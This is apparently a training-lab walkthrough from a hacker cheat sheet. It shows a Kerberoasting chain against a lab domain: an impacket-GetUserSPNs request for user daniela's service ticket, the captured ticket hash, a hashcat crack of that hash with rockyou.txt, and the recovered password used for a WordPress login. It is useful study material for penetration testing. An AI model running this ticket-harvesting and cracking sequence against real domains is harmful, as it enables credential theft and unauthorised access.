# Speak Kerberoast and Enter

Kerberoasting the daniela user account
>``` shell
>kali@kali:~/beyond$ proxychains -q impacket-GetUserSPNs -request -dc-ip 172.16.6.240 beyond.com/john
>
># ========== Expected Result ==========
>Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
>
>Password:
>ServicePrincipalName      Name     MemberOf  PasswordLastSet             LastLogon                   Delegation 
>------------------------  -------  --------  --------------------------  --------------------------  ----------
>http/internalsrv1.beyond.com  daniela            2022-09-29 04:17:20.062328  2022-10-05 03:59:48.376728             
>
>[-] CCache file is not found. Skipping...
>$krb5tgs$23$*daniela$BEYOND.COM$beyond.com/daniela*$4c6c4600baa0ef09e40fde6130e3d770$49023c03dcf9a21ea5b943e179f843c575d8f54b1cd85ab12658364c23a46fa53b3db5f924a66b1b28143f6a357abea0cf89af42e08fc38d23b205a3e1b46aed9e181446fa7002def837df76ca5345e3277abaa86...
>2e430c5a8f0235b45b66c5fe0c8b4ba16efc91586fc22c2c9c1d8d0434d4901d32665cceac1ab0cdcb89ae2c2d688307b9c5d361beba29b75827b058de5a5bba8e60af3562f935bd34feebad8e94d44c0aebc032a3661001541b4e30a20d380cac5047d2dafeb70e1ca3f9e507eb72a4c7
># =====================================
>```

Cracking the TGS-REP hash
>``` shell
>kali@kali:~/beyond$ sudo hashcat -m 13100 daniela.hash /usr/share/wordlists/rockyou.txt --force
>
># ========== Expected Result ==========
>...
>$krb5tgs$23$*daniela$BEYOND.COM$beyond.com/daniela*$b0750f4754ff26fe77d2288ae3cca539$0922083b88587a2e765298cc7d499b368f7c39c7f6941a4b419d8bb1405e7097891c1af0a885ee76ccd1f32e988d6c4653e5cf4ab9602004d84a6e1702d2fbd5a3379bd376de696b0e8993aeef5b1e78fb24f5d3c
>...
>3d3e9d5c0770cc6754c338887f11b5a85563de36196b00d5cddecf494cfc43fcbef3b73ade4c9b09c8ef405b801d205bf0b21a3bca7ad3f59b0ac7f6184ecc1d6f066016bb37552ff6dd098f934b2405b99501f2287128bff4071409cec4e9545d9fad76e6b18900b308eaac8b575f60bb:DANIelaRO123
>...
># =====================================
>```

Successful Login to WordPress as daniela
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Speak-Kerberoast-and-Enter-1.png)
